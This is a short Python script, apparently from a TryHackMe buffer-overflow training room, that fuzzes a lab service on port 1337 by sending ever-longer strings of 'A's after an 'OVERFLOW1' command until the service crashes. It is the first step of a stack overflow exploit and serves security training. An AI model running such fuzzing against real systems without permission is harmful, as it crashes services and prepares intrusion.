#!/usr/bin/env python3
# A script from TryHackMe. Works well.
import socket, sys, time

ip = "10.10.165.208"

port = 1337
timeout = 1
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
    try:
        # with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        with socket.socket() as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            msg = s.recv(1024)
            print(f'We are connected: {msg}')
            print(f'Fuzzing with {format(len(string) - len(prefix))} bytes')
            # Sending string in latin-1 format
            print(string)
            s.send(bytes(string, "latin-1"))
            msg2 = s.recv(1024)
            print(f'Server replied: {msg2} \n')
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(0.5)


